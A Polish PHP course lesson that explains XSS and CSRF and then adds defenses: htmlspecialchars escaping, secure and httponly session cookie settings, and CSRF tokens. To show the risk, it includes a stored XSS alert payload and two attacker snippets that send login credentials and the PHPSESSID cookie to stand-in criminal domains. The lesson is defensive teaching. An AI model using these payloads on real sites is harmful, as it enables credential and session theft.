> Przeglądarka internetowa nie wie, które fragmenty odebranego kodu HTML zostały napisane przez twórcę strony, a które wpisał złośliwy użytkownik w formularzu. Jeśli w kodzie znajdzie się tag `<script>` lub zdarzenie JavaScript, przeglądarka po prostu **bezrefleksyjnie go wykona** w kontekście zalogowanego użytkownika!

---

### 🔎 Rodzaje ataków XSS

| Typ ataku             | Nazwa angielska           | Opis działania                                                                                                                                                                          | Poziom zagrożenia |
| :-------------------- | :------------------------ | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :---------------- |
| **Trwały (Zapisany)** | *Stored / Persistent XSS* | Złośliwy skrypt zostaje **zapisany na stałe w bazie danych** (np. w nazwie użytkownika, treści komentarza czy posta). Każdy, kto wyświetli daną podstronę, automatycznie odpala skrypt. | 🔴 Krytyczny       |
| **Odbity**            | *Reflected XSS*           | Skrypt jest przekazywany w żądaniu (np. jako parametr w linku URL `?search=<script>...`) i natychmiast „odbijany” przez serwer w odpowiedzi HTML.                                       | 🟠 Wysoki          |
| **Oparty na DOM**     | *DOM-based XSS*           | Podatność występuje bezpośrednio w kodzie JavaScript po stronie klienta (np. skrypt JS odczytuje hash URL i niebezpiecznie wstawia go przez `innerHTML`).                               | 🟡 Średni / Wysoki |

---

### 😱 Aktualnie nasz kod jest na to podatny!

Nasze metody  rejestracji i logowania nie weryfikują czy nazwa użytkownika jest bezpiecznym ciągiem znaków.  
Zobacz co się stanie gdy zarejestrujemy się używając poniższej frazy jako nazwy użytkownika:

```html
<script>alert('Twoja strona jest podatna na XSS!');</script>
```

Teraz za każdym razem gdy na stronie bedzie wyświetlana nazwa tego użytkownika, przeglądarka będzie wyświetlała wyskakujące okienko z komunikatem: „Twoja strona jest podatna na XSS!”.

![](/public/courses/php/Images/test-podatności-XSS-1.png)

Co dzieje się dalej?
1. Baza danych zapisuje ten tekst dosłownie.
2. Gdy inny użytkownik otwiera stronę z wpisami, serwer PHP generuje kod HTML:
   ```html
   <small><script>alert('Twoja strona jest podatna na XSS!');</script></small>
   ```
3. Przeglądarka ofiary parsuje tag `<script>` i wyświetla wyskakujące okno `alert()`.

Jednak standardowy `alert()` to zwykły trolling. Gorzej jeżeli cyber-przestępca wpisze poniższy kod:
```js
document.querySelector("form[action='/login']").setAttribute("action","https://domena-kryminalna.pl/xss") 
```
Infekcja spowoduje że dane logowania z formularza nie trafią na nasz backend tylko zupełnie gdzie indziej. Do tego request przekaże je w sposób całkowicie jawny.

![](/public/courses/php/Images/test-podatności-XSS-2.png)

Jednak najgorszą sytuacją jest ta gdy cyberprzestępca przechwyci ciasteczko **PHPSESSID**.
Jeżeli przestepca użył by takiego kodu:
```js
new Image().src = 'http://domena-kryminalisty.com/log.php?data=' + encodeURIComponent(document.cookie); 
```
Może przesłać na swój serwer identyfikator sesji ofiary:

![](/public/courses/php/Images/test-podatności-XSS-3.png)

Jak dobrze pamiętasz ciasteczko **PHPSESSID** posiada identyfikator po którym PHP wie z kim gada. Wystarczy je u siebie podmieniać i po odświeżeniu zalogowaliśmy się bez znajomości loginu i hasła ofiary.

![](/public/courses/php/Images/test-podatności-XSS-3-efekt.png)

### 🔒 Zabezpieczenie metod przed XSS

Skoro już wiesz jak banalny w użyciu jest atak XSS to pewnie rozumiesz że nie warto ufać użytkownikom.

Dlatego gdy cokolwiek od nich otrzymamy musimy potraktować jako ciąg znaków i część z nich zapisać jako [HTML Entities](https://www.w3schools.com/html/html_entities.asp):

```php
htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
```
Wszelkie ustawienia tej funkcji możesz sprawdzić w [dokumentacji PHP](https://www.php.net/htmlspecialchars). Jednak powyższe jest najszersze w konwersji na zapis encji HTML i z `UTF-8`, który obejmuje wszystkie języki europejskie.

Napiszmy teraz nową prywatną metodę pomocniczą dodając lekką warstwę abstrakcji na kod:

```php
private function unsetXSS(string &$value): void {
    $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}
```
> Powyższa metoda przyjmuje referencję do zmiennej stąd zastosowanie `&`. Dzieki czemu nie bedzie konieczności przesyłania kopi każdej zmiennej i nadpisywania jej wynikiem. Wystarczy tak jak poniżej wywołać metodę przekazując dany parametr jako oryginał a nie kopię:

```php
public function register(string $username, string $login, string $pass, string $repass): string
{
    $this->unsetXSS($username);
    $this->unsetXSS($login);
    $this->unsetXSS($pass);
    $this->unsetXSS($repass);

    // ... reszta kodu bez zmian
}

public function login(string $login, string $pass): string
{
    $this->unsetXSS($login);
    $this->unsetXSS($pass);
    
    // ... reszta kodu bez zmian
}
```
> Zabezpieczenie wartości przekazanych z pól formularza wymagane jest w sumie tylko w tych dwóch powyższych metodach, ponieważ kolejne metody pomocnicze dostaną już oczyszczone wartości.



### 🍪 Dodatkowe warstwy obrony ciasteczka sesji

Oprócz funkcji `htmlspecialchars()` warto odgórnie zwiekszyć zasady komunikacji miedzy klientem przeglądarki a PHP. Mianowicie zmodyfikujmy konfigurację pliku  `src/Infrastructure/Sessions/PHPSession.php`:

```php
// Konfiguracja bezpiecznej sesji przed jej wystartowaniem
session_set_cookie_params([
    'lifetime' => 0,     // czas wygaśnięcia ciasteczka (0 = do momentu zamknięcia przeglądarki)
    'path' => '/',     // ciasteczko działa na całej domenie, którą zapisano w 'domain'
    'domain' => '',     // puste (empty) oznacza żę dla TEJ AKTUALNEJ domeny na której działa PHP. Alternatywnie możesz podać subdomenę
    'secure' => true,     // Ciasteczko przesyłane tylko przez szyfrowane połączenie HTTPS
    'httponly' => true,   // Blokada dostępu dla JavaScriptu (ochrona przed kradzieżą sesji)
    'samesite' => 'Lax'   // Częściowa, wręcz podstawowa ochrona przed atakami CSRF
]);
session_start();
```

> [!NOTE]
> Domena to adres DNS składający się z nazwy głównej wymyślonej przez właściciela i jednego z dostępnych rozszerzeń (np. .pl, .com). Na przykład: `google.com`, `wikipedia.org`, `gov.pl`, `ciemnastrona.com.pl`. 
> Subdomena to **poddomena** jest to nazwa dodana do domeny głównej. Na przykład: `mail.google.com`, `forum.pasjonaci-wendkarstwa.pl`.
>
> Przeglądarki i aplikacje internetowe pracują na `http:80` lub `https:443`. Dopisana literka `s` odnosi się do *secure* co jest związane z szyfrowaniem `SSL/TLS`. Najprościej mówiąc podczas komunikacji miedzy serwerem a klientem gdy operujemy na `https` to pakiety opuszczając przeglądarkę lub usługę Apache/Nginix to są już zaszyfrowane i takie wędrują przez sieć. 
> Natomiast gdy pracujemy na `http` to szyfrowanie zawartości pakietu nigdy nie następuje i można taki pakiet przechwycić i odczytać jako tekst jawny.

![](/public/courses/php/Images/zabezpieczenie-ciasteczka-PHPSESSID.png)

> [!WARNING]
> `samesite` ma dwa możliwe parametry do ustawienia:
> - `Lax` - Ciasteczka nie są wysyłane przy zapytaniach na inne domeny z wyjątkiem żądań *`GET`*.
> - `Strict` - Ciasteczko **_NIE JEST W OGÓLE_** wysyłane na inne domeny. Powoduje to całkowitą niemożność implementacji `OAuth` czyli logowania przy pomocy np. konta google do twojego serwisu.  

## 🔴 Atak CSRF

Ten rodzaj ataku jest ślepy. Polega na stworzeniu szemranej strony WwW cyber-przestępcy na której wywoływana jest akcja wysłania żądania **`POST`** do innej strony wykorzystując ciasteczko sessji tamtej strony by się uwiarygodnić i wykonać daną akcję. Alternatywnie można stworzyć link do akcji z parametrami w adresie URL (metoda *`GET`*). Wtedy ofiara klikając go mówi przeglądarce że chce wykonać tą akcję.

### 🔒 Zabezpieczenie przed CSRF

By się przed tym ustrzec należy po utworzeniu sesji PHP wygenerować po stronie serwera losowy ciąg znaków i np.: umieścić go w superglobalnej `$_SESSION`: 

```php
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
> Jeżeli token nie istnieje to generujemy losowe $32$ bajty. Ptem z nich robimy $64$ znakowy `string` konwertując bajty na zapis szesnastkowy. Ten `string` jest przechowywany w `$_SESSION['csrf_token']` i tylko serwer go zna.
```

W klasie `Auth` tworzymy kolejną, tym razem publiczną metodę do walidacji poprawności tokenu:

```php
public function checkTokenCRFT(): void{
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        http_response_code(403);
        die("CSRF token invalid");
    }
}
```
Jeżeli w zapytaniu nie wysłano wartości tokenu w danych formularza z nazwą `csrf_token` lub jest ona niezgodna z tym co przechowuje serwer to wywoływana jest funkcja ustawiająca nagłówek odpowiedzi serwera $403$ **Forbidden** i kończąca dalszy proces.

Tą metodę należy wywołać na początku każdej innej metody rozpoczynającej pracę z danymi dowolnego formularza. Tak samo jak zrobiliśmy to w przypadku `unsetXSS()`:
```php
$this->checkTokenCRFT()
```

Teraz pozostało nam preparować komponenty stron i w ich formularzu ustawić „haczyk” na wstrzykniecie tokenu:
```html
<input type="hidden" name="csrf_token" value="%%csrf_token%%">
```

W `router.php` dopisujemy linię podmieniającą „haczyk” na wartość tokenu:

```php
$register_login_section = str_replace("%%csrf_token%%", $_SESSION['csrf_token'], $register_login_section);
```
Efekt jest taki że server generuje losowy ciąg znaków który zwraca jako ukrytą kontrolkę w stronie html klienta. Wysyłąjąc formularz wartość ukrytej kontrolki jest doklejana do zapytania. Jeżeli serwer nie otrzyma jaj lub otrzyma inną wartość to odmawia wykonania akcji.

Poniżej przykład gdy na stronie podmieniłem wartość tej ukrytej kontrolki więc serwer zamiast zalogować to zwrócił `ERROR 403`: 

![](/public/courses/php/Images/zabezpieczone-logowanie-tokenem-CRFT.png)


### <span class="header-koala"><span>🦾</span><span>🐨</span><span>🦾</span></span> Co masz wynieść z tej lekcji:

- Ładny URL wymaga przygotowania routera mapującego linki na wywołanie odpowiednich metod.
- Hasła w bazie danych powinny być przechowywane w formie zahashowanej.
- Wystartowanie sesji pozwala odróżnić zalogowanego użytkownika od anonimowego i zwrócić odpowiedni widok.
- Poprawne przygotowanie parametrów sesji pozwala uchronić **PHPSESSID**.
- `htmlspecialchars()` zamienia znaki specjalne HTML na ich encje np. `<` na `&lt;`, `>` na `&gt;`, `&` na `&amp;` i inne. Co pozwala uchronić się przed jednym z rodzajów ataków XSS.
- Tokeny CRFT mają zapobiegać przed wykonaniem akcji w twojej witrynie bez twojej zgody np. usunięcie przez cyber-przestępcę. Serwer porównuje otrzymany token np z formularza z tym przechowywanym w sesji.

---

Aktualny stan kodu ma pewien brak.  
Dopisz więc brakującą dokumentację _**PHPDocs**_, a w kolejnej lekcje będziemy dodawać kolejne funkcjonalności i refaktoryzować cały stan projektu. 😉
